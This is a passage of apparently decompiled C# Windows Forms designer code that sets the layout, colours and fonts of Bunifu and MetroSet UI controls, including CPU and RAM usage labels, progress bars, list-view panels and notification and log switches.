			this.bunifuSeparator4.Location = new System.Drawing.Point(29, 308);
			this.bunifuSeparator4.Name = "bunifuSeparator4";
			this.bunifuSeparator4.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator4.Size = new System.Drawing.Size(65, 16);
			this.bunifuSeparator4.TabIndex = 6;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator4, "");
			this.bunifuSeparator3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator3.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator3.BackgroundImage");
			this.bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator3.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator3, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator3, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator3.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator3.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator3.LineThickness = 1;
			this.bunifuSeparator3.Location = new System.Drawing.Point(33, 253);
			this.bunifuSeparator3.Name = "bunifuSeparator3";
			this.bunifuSeparator3.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator3.Size = new System.Drawing.Size(56, 14);
			this.bunifuSeparator3.TabIndex = 5;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator3, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator3, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator3, "");
			this.bunifuSeparator12.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator12.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator12.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator12.BackgroundImage");
			this.bunifuSeparator12.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator12.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator12, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator12, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator12.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator12.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.RightEdgeFaded;
			this.bunifuSeparator12.LineThickness = 1;
			this.bunifuSeparator12.Location = new System.Drawing.Point(124, 97);
			this.bunifuSeparator12.Name = "bunifuSeparator12";
			this.bunifuSeparator12.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator12.Size = new System.Drawing.Size(1086, 10);
			this.bunifuSeparator12.TabIndex = 79;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator12, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator12, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator12, "");
			this.bunifuSeparator14.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator14.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator14.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator14.BackgroundImage");
			this.bunifuSeparator14.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator14.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator14, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator14, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator14.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator14.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.RightEdgeFaded;
			this.bunifuSeparator14.LineThickness = 1;
			this.bunifuSeparator14.Location = new System.Drawing.Point(118, 102);
			this.bunifuSeparator14.Name = "bunifuSeparator14";
			this.bunifuSeparator14.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator14.Size = new System.Drawing.Size(10, 606);
			this.bunifuSeparator14.TabIndex = 78;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator14, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator14, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator14, "");
			this.bunifuIconButton1.AllowAnimations = true;
			this.bunifuIconButton1.AllowBorderColorChanges = true;
			this.bunifuIconButton1.AllowMouseEffects = true;
			this.bunifuIconButton1.AnimationSpeed = 200;
			this.bunifuIconButton1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuIconButton1.BackgroundImage");
			this.bunifuIconButton1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuIconButton1.BorderColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BorderRadius = 1;
			this.bunifuIconButton1.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton1.BorderThickness = 1;
			this.bunifuIconButton1.ColorContrastOnClick = 30;
			this.bunifuIconButton1.ColorContrastOnHover = 30;
			this.bunifuIconButton1.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges7.BottomLeft = true;
			borderEdges7.BottomRight = true;
			borderEdges7.TopLeft = true;
			borderEdges7.TopRight = true;
			this.bunifuIconButton1.CustomizableEdges = borderEdges7;
			this.bunifuTransition2.SetDecoration(this.bunifuIconButton1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuIconButton1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuIconButton1.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton1.Image = null;
			this.bunifuIconButton1.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton1.Location = new System.Drawing.Point(163, 50);
			this.bunifuIconButton1.Name = "bunifuIconButton1";
			this.bunifuIconButton1.RoundBorders = false;
			this.bunifuIconButton1.ShowBorders = true;
			this.bunifuIconButton1.Size = new System.Drawing.Size(269, 53);
			this.bunifuIconButton1.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton1.TabIndex = 80;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton1, "");
			this.lblRAM.AllowParentOverrides = false;
			this.lblRAM.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.lblRAM.AutoEllipsis = false;
			this.lblRAM.CursorType = null;
			this.bunifuTransition2.SetDecoration(this.lblRAM, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.lblRAM, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.lblRAM.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.lblRAM.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.lblRAM.Location = new System.Drawing.Point(1362, 706);
			this.lblRAM.Name = "lblRAM";
			this.lblRAM.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.lblRAM.Size = new System.Drawing.Size(36, 15);
			this.lblRAM.TabIndex = 86;
			this.lblRAM.Text = "39.25%";
			this.lblRAM.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.lblRAM.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.lblRAM, "");
			this.bunifuToolTip1.SetToolTipIcon(this.lblRAM, null);
			this.bunifuToolTip1.SetToolTipTitle(this.lblRAM, "");
			this.lblCPU.AllowParentOverrides = false;
			this.lblCPU.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.lblCPU.AutoEllipsis = false;
			this.lblCPU.CursorType = null;
			this.bunifuTransition2.SetDecoration(this.lblCPU, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.lblCPU, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.lblCPU.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.lblCPU.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.lblCPU.Location = new System.Drawing.Point(1143, 706);
			this.lblCPU.Name = "lblCPU";
			this.lblCPU.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.lblCPU.Size = new System.Drawing.Size(36, 15);
			this.lblCPU.TabIndex = 85;
			this.lblCPU.Text = "12.07%";
			this.lblCPU.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.lblCPU.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.lblCPU, "");
			this.bunifuToolTip1.SetToolTipIcon(this.lblCPU, null);
			this.bunifuToolTip1.SetToolTipTitle(this.lblCPU, "");
			this.bunifuLabel4.AllowParentOverrides = false;
			this.bunifuLabel4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuLabel4.AutoEllipsis = false;
			this.bunifuLabel4.CursorType = null;
			this.bunifuTransition2.SetDecoration(this.bunifuLabel4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuLabel4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuLabel4.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.bunifuLabel4.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel4.Location = new System.Drawing.Point(1192, 706);
			this.bunifuLabel4.Name = "bunifuLabel4";
			this.bunifuLabel4.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel4.Size = new System.Drawing.Size(26, 15);
			this.bunifuLabel4.TabIndex = 84;
			this.bunifuLabel4.Text = "Ram:";
			this.bunifuLabel4.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel4.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.bunifuLabel4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuLabel4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuLabel4, "");
			this.bunifuLabel3.AllowParentOverrides = false;
			this.bunifuLabel3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuLabel3.AutoEllipsis = false;
			this.bunifuLabel3.CursorType = null;
			this.bunifuTransition2.SetDecoration(this.bunifuLabel3, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuLabel3, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuLabel3.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.bunifuLabel3.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel3.Location = new System.Drawing.Point(974, 706);
			this.bunifuLabel3.Name = "bunifuLabel3";
			this.bunifuLabel3.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel3.Size = new System.Drawing.Size(25, 15);
			this.bunifuLabel3.TabIndex = 83;
			this.bunifuLabel3.Text = "Cpu:";
			this.bunifuLabel3.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel3.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.bunifuLabel3, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuLabel3, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuLabel3, "");
			this.bunifuProgressBar2.AllowAnimations = false;
			this.bunifuProgressBar2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuProgressBar2.Animation = 0;
			this.bunifuProgressBar2.AnimationSpeed = 220;
			this.bunifuProgressBar2.AnimationStep = 10;
			this.bunifuProgressBar2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuProgressBar2.BackgroundImage");
			this.bunifuProgressBar2.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			this.bunifuProgressBar2.BorderRadius = 9;
			this.bunifuProgressBar2.BorderThickness = 1;
			this.bunifuTransition1.SetDecoration(this.bunifuProgressBar2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.bunifuProgressBar2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuProgressBar2.Location = new System.Drawing.Point(1224, 707);
			this.bunifuProgressBar2.Maximum = 100;
			this.bunifuProgressBar2.MaximumValue = 100;
			this.bunifuProgressBar2.Minimum = 0;
			this.bunifuProgressBar2.MinimumValue = 0;
			this.bunifuProgressBar2.Name = "bunifuProgressBar2";
			this.bunifuProgressBar2.Orientation = System.Windows.Forms.Orientation.Horizontal;
			this.bunifuProgressBar2.ProgressBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar2.ProgressColorLeft = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuProgressBar2.ProgressColorRight = System.Drawing.Color.FromArgb(45, 47, 59);
			this.bunifuProgressBar2.Size = new System.Drawing.Size(132, 13);
			this.bunifuProgressBar2.TabIndex = 82;
			this.bunifuToolTip1.SetToolTip(this.bunifuProgressBar2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuProgressBar2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuProgressBar2, "");
			this.bunifuProgressBar2.Value = 50;
			this.bunifuProgressBar2.ValueByTransition = 50;
			this.bunifuProgressBar1.AllowAnimations = false;
			this.bunifuProgressBar1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuProgressBar1.Animation = 0;
			this.bunifuProgressBar1.AnimationSpeed = 220;
			this.bunifuProgressBar1.AnimationStep = 10;
			this.bunifuProgressBar1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuProgressBar1.BackgroundImage");
			this.bunifuProgressBar1.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			this.bunifuProgressBar1.BorderRadius = 9;
			this.bunifuProgressBar1.BorderThickness = 1;
			this.bunifuTransition1.SetDecoration(this.bunifuProgressBar1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.bunifuProgressBar1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuProgressBar1.Location = new System.Drawing.Point(1005, 707);
			this.bunifuProgressBar1.Maximum = 100;
			this.bunifuProgressBar1.MaximumValue = 100;
			this.bunifuProgressBar1.Minimum = 0;
			this.bunifuProgressBar1.MinimumValue = 0;
			this.bunifuProgressBar1.Name = "bunifuProgressBar1";
			this.bunifuProgressBar1.Orientation = System.Windows.Forms.Orientation.Horizontal;
			this.bunifuProgressBar1.ProgressBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar1.ProgressColorLeft = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuProgressBar1.ProgressColorRight = System.Drawing.Color.FromArgb(45, 47, 59);
			this.bunifuProgressBar1.Size = new System.Drawing.Size(132, 13);
			this.bunifuProgressBar1.TabIndex = 81;
			this.bunifuToolTip1.SetToolTip(this.bunifuProgressBar1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuProgressBar1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuProgressBar1, "");
			this.bunifuProgressBar1.Value = 50;
			this.bunifuProgressBar1.ValueByTransition = 50;
			this.customLabel1.AllowParentOverrides = false;
			this.customLabel1.AutoEllipsis = false;
			this.customLabel1.Cursor = System.Windows.Forms.Cursors.Default;
			this.customLabel1.CursorType = System.Windows.Forms.Cursors.Default;
			this.bunifuTransition2.SetDecoration(this.customLabel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.customLabel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.customLabel1.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.customLabel1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.customLabel1.Location = new System.Drawing.Point(273, 71);
			this.customLabel1.Name = "customLabel1";
			this.customLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.customLabel1.Size = new System.Drawing.Size(45, 18);
			this.customLabel1.TabIndex = 87;
			this.customLabel1.Text = "HOME";
			this.customLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.customLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.customLabel1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.customLabel1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.customLabel1, "");
			this.metroSetControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.metroSetControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.CloseHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.CloseNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuTransition2.SetDecoration(this.metroSetControlBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.metroSetControlBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.metroSetControlBox1.DisabledForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.IsDerivedStyle = true;
			this.metroSetControlBox1.Location = new System.Drawing.Point(1310, 7);
			this.metroSetControlBox1.MaximizeBox = true;
			this.metroSetControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MaximizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MaximizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.MinimizeBox = true;
			this.metroSetControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MinimizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MinimizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.Name = "metroSetControlBox1";
			this.metroSetControlBox1.Size = new System.Drawing.Size(100, 25);
			this.metroSetControlBox1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetControlBox1.StyleManager = null;
			this.metroSetControlBox1.TabIndex = 157;
			this.metroSetControlBox1.Text = "metroSetControlBox1";
			this.metroSetControlBox1.ThemeAuthor = "Narwin";
			this.metroSetControlBox1.ThemeName = "MetroLite";
			this.bunifuToolTip1.SetToolTip(this.metroSetControlBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.metroSetControlBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.metroSetControlBox1, "");
			this.bunifuPanel2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuPanel2.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuPanel2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuPanel2.BackgroundImage");
			this.bunifuPanel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuPanel2.BorderColor = System.Drawing.Color.Transparent;
			this.bunifuPanel2.BorderRadius = 3;
			this.bunifuPanel2.BorderThickness = 1;
			this.bunifuPanel2.Controls.Add(this.listView2);
			this.bunifuPanel2.Controls.Add(this.bunifuPanel1);
			this.bunifuPanel2.Controls.Add(this.listView1);
			this.bunifuTransition2.SetDecoration(this.bunifuPanel2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuPanel2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuPanel2.Location = new System.Drawing.Point(124, 105);
			this.bunifuPanel2.Name = "bunifuPanel2";
			this.bunifuPanel2.ShowBorders = true;
			this.bunifuPanel2.Size = new System.Drawing.Size(1317, 591);
			this.bunifuPanel2.TabIndex = 158;
			this.bunifuToolTip1.SetToolTip(this.bunifuPanel2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuPanel2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuPanel2, "");
			this.bunifuPanel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuPanel1.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuPanel1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuPanel1.BackgroundImage");
			this.bunifuPanel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuPanel1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuPanel1.BorderRadius = 3;
			this.bunifuPanel1.BorderThickness = 1;
			this.bunifuPanel1.Controls.Add(this.chkNot);
			this.bunifuPanel1.Controls.Add(this.bunifuSeparator17);
			this.bunifuPanel1.Controls.Add(this.customLabel4);
			this.bunifuPanel1.Controls.Add(this.bunifuSeparator15);
			this.bunifuPanel1.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel);
			this.bunifuPanel1.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1);
			this.bunifuPanel1.Controls.Add(this.chkLogs);
			this.bunifuPanel1.Controls.Add(this.metroSetSwitch1);
			this.bunifuPanel1.Controls.Add(this.customLabel3);
			this.bunifuPanel1.Controls.Add(this.customLabel2);
			this.bunifuTransition2.SetDecoration(this.bunifuPanel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuPanel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuPanel1.Location = new System.Drawing.Point(-36, 463);
			this.bunifuPanel1.Name = "bunifuPanel1";
			this.bunifuPanel1.ShowBorders = false;
			this.bunifuPanel1.Size = new System.Drawing.Size(1367, 40);
			this.bunifuPanel1.TabIndex = 165;
			this.bunifuToolTip1.SetToolTip(this.bunifuPanel1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuPanel1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuPanel1, "");
			this.chkNot.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.chkNot.BackColor = System.Drawing.Color.Transparent;
			this.chkNot.BackgroundColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkNot.BorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkNot.CheckColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkNot.CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
			this.chkNot.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition2.SetDecoration(this.chkNot, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.chkNot, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.chkNot.DisabledBorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkNot.DisabledCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkNot.DisabledUnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkNot.IsDerivedStyle = true;
			this.chkNot.Location = new System.Drawing.Point(1249, 9);
			this.chkNot.Name = "chkNot";
			this.chkNot.Size = new System.Drawing.Size(58, 22);
			this.chkNot.Style = MetroSet_UI.Enums.Style.Custom;
			this.chkNot.StyleManager = null;
			this.chkNot.Switched = false;
			this.chkNot.SymbolColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkNot.TabIndex = 164;
			this.chkNot.Text = "metroSetSwitch3";
			this.chkNot.ThemeAuthor = "Narwin";
			this.chkNot.ThemeName = "MetroDark";
			this.bunifuToolTip1.SetToolTip(this.chkNot, "");
			this.bunifuToolTip1.SetToolTipIcon(this.chkNot, null);
			this.bunifuToolTip1.SetToolTipTitle(this.chkNot, "");
			this.chkNot.UnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.bunifuSeparator17.Anchor = System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator17.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator17.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator17.BackgroundImage");
			this.bunifuSeparator17.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator17.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator17, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator17, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator17.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator17.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator17.LineThickness = 1;
			this.bunifuSeparator17.Location = new System.Drawing.Point(119, 34);
			this.bunifuSeparator17.Name = "bunifuSeparator17";
			this.bunifuSeparator17.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator17.Size = new System.Drawing.Size(1123, 10);
			this.bunifuSeparator17.TabIndex = 81;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator17, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator17, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator17, "");
			this.customLabel4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.customLabel4.AutoSize = true;
			this.bunifuTransition1.SetDecoration(this.customLabel4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.customLabel4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.customLabel4.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.customLabel4.Location = new System.Drawing.Point(1148, 10);
			this.customLabel4.Name = "customLabel4";
			this.customLabel4.Size = new System.Drawing.Size(103, 20);
			this.customLabel4.TabIndex = 163;
			this.customLabel4.Text = "Notifications:";
			this.bunifuToolTip1.SetToolTip(this.customLabel4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.customLabel4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.customLabel4, "");
			this.bunifuSeparator15.Anchor = System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator15.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator15.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator15.BackgroundImage");
			this.bunifuSeparator15.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator15.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator15, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator15, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator15.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator15.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator15.LineThickness = 1;
			this.bunifuSeparator15.Location = new System.Drawing.Point(119, -5);
